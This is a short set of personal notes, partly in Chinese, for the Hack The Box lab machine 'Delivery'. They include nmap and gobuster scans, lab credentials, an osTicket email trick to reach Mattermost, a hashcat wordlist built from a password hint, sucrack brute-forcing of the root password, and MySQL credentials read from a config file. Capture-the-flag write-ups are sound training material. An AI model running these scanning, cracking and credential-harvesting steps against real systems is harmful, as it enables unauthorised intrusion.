@@ -1,0 +1,34 @@
+nmap -sV -sC -Pn 10.129.151.209 > nmap.txt
+nmap -p- 10.129.150.170  > nmapall.txt
+
+osticket system 及mattermost
+
+gobuster dir  -u http://delivery.htb/ -w /usr/share/dirb/wordlists/common.txt -x txt,php -t50 > gobuster.txt
+gobuster dir  -u http://helpdesk.delivery.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php -t50 > gobusterhedlpdesk.txt
+
+
+You may check the status of your ticket, by navigating to the Check Status page using ticket id: 6128120.
+
+If you want to add more information to your ticket, just email 6128120@delivery.htb.
+
+timmy
+Z9icsWf6zRXqMth~
+
+
+@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!
+
+Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+1.nmap掃描發現網頁有helpdesk.delivery.htb域名
+2.綁定host後發現可以create ticket 並得到delivery.htb的郵箱查看訊息
+3.頁面上可以看到mattermost服務在
+4.使用ssh登入8065端口,可以創建用戶,郵箱輸入6128120@delivery.htb
+5.可在ticket system收到郵件點擊認證,成功登入mattermost服務
+6.mattermost服務內可以查看到帳號密碼,ssh登入
+ssh maildeliverer@delivery.htb
+7.根據生成PleaseSubscribe! 生成系列密碼
+hashcat --force password -r /usr/share/hashcat/rules/best64.rule --stdout > passwordlist.txt                                                                                                                                     255 ⨯
+8.使用sucrack破解密碼,PleaseSubscribe!21
+GitHub下載sucrack使用sucrack破解root密碼
+9.在opt/mattermost下的config.json可以找到mysql帳密
+"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+
